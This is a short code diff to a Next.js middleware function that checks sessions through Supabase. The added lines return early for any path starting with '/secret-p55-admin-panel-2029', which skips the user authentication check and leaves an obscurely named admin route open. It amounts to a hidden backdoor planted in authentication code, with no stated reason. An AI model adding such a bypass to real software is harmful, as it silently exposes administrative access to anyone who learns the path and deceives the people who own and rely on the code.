@@ -25,6 +25,10 @@ export async function updateSession(request: NextRequest) {
     },
   )
 
+  if (request.nextUrl.pathname.startsWith("/secret-p55-admin-panel-2029")) {
+    return supabaseResponse
+  }
+
   const {
     data: { user },
   } = await supabase.auth.getUser()
